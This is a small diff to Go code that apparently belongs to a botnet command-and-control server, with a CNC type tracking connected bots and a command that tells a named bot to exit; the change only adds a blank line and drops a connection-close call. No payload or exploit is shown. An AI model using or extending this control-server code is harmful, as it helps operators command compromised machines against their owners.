@@ -7,6 +7,7 @@ import (
 )
 
 
+
 func (cnc *CNC) worker(bot *Bot) {
 	defer bot.conn.Close()
 
@@ -105,7 +106,6 @@ func (cnc *CNC) command(client *Client, line string) {
 		for _, bot := range cnc.Bots {
 			if bot.name	== args[0] {
 				bot.conn.Write([]byte("exit"))
-				bot.conn.Close()
 				bot.alive = false
 				return
 			}
